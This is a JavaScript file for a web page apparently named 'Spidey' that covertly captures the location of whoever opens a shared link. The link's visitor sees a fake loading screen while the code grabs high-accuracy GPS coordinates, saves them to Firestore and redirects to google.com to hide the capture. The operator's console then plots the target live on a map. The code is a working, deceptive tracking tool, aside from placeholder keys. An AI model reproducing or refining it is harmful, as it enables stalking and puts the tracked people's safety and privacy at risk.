import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

// CONFIGURACIÓN DE FIREBASE
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};

// Inicializar Firebase, Firestore y Auth
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);

let map;
let spiderMarker = null;
let ubicacionObjetivo = null; 
const ubicacionPorDefecto = [14.3333, -90.6667]; 

// Icono personalizado de araña
const spiderIcon = L.divIcon({
    html: '<div style="font-size: 32px; line-height: 1; text-align: center;">🕷️</div>',
    className: 'spider-marker',
    iconSize: [36, 36],
    iconAnchor: [18, 18]
});

const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", async function () {
    try {
        // Autenticación anónima para cumplir con las reglas de Firestore (request.auth != null)
        await signInAnonymously(auth);
        console.log("Sesión segura iniciada.");
    } catch (error) {
        console.error("Error al autenticar en Firebase Auth:", error);
    }

    // ESCENARIO A: Dispositivo secundario
    if (targetId) {
        document.body.innerHTML = "<div style='color:white; text-align:center; padding-top:20%; font-family:sans-serif;'>Cargando contenido...</div>";
        capturarYSalir(targetId);
        return;
    }

    // ESCENARIO B: Consola Principal
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    setTimeout(() => { map.invalidateSize(); }, 200);

    // Escuchar la base de datos
    escucharObjetivoRemoto("objetivo_principal");
});

// CAPTURA DE UBICACIÓN
function capturarYSalir(id) {
    if (!navigator.geolocation) {
        window.location.replace("https://www.google.com");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            try {
                // Escribe en Firestore aprovechando el token de autenticación anónima
                await setDoc(doc(db, "rastreos", id), {
                    lat: lat,
                    lng: lng,
                    timestamp: new Date().toISOString()
                });
            } catch (e) {
                console.error("Error al guardar en Firebase:", e);
            } finally {
                window.location.replace("https://www.google.com");
            }
        },
        (error) => {
            window.location.replace("https://www.google.com");
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );
}

// ESCUCHAR DATOS EN TIEMPO REAL
function escucharObjetivoRemoto(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            ubicacionObjetivo = [data.lat, data.lng];

            if (!spiderMarker) {
                spiderMarker = L.marker(ubicacionObjetivo, { icon: spiderIcon }).addTo(map);
            } else {
                spiderMarker.setLatLng(ubicacionObjetivo);
            }

            const googleMapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
            
            spiderMarker.bindPopup(`
                <div style="text-align:center;">
                    <b>🕷️ PUNTO DETECTADO</b><br>
                    Lat: ${data.lat.toFixed(5)}<br>
                    Lng: ${data.lng.toFixed(5)}<br><br>
                    <a href="${googleMapsUrl}" target="_blank" style="color: #d9534f; font-weight: bold;">Abrir en Google Maps 📍</a>
                </div>
            `);

            const banner = document.getElementById('banner-status');
            if (banner) {
                banner.innerHTML = "¡SEÑAL DETECTADA!<br>NODO SPIDEY ENLACE OK";
            }

            irAlPuntoDeAcceso();
        }
    });
}

// FUNCIONALIDADES DE LOS BOTONES
function irAlPuntoDeAcceso() {
    if (ubicacionObjetivo) {
        map.invalidateSize();
        map.setView(ubicacionObjetivo, 18, { animate: true, duration: 1.5 });
        if (spiderMarker) {
            spiderMarker.openPopup();
        }
    }
}

window.accionRastrearObjetivo = function() {
    if (ubicacionObjetivo) {
        irAlPuntoDeAcceso();
    } else {
        alert("Aún no hay coordenadas recibidas.");
    }
};

window.compartirEnlace = function() {
    const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("Enlace copiado correctamente.");
    });
};

window.obtenerUbicacionActual = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            L.marker([lat, lng]).addTo(map).bindPopup("Tu ubicación actual").openPopup();
        });
    }
};

window.centrarUbicacion = () => irAlPuntoDeAcceso();
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat abierto.");
window.verArchivo = () => alert("Abriendo registros...");
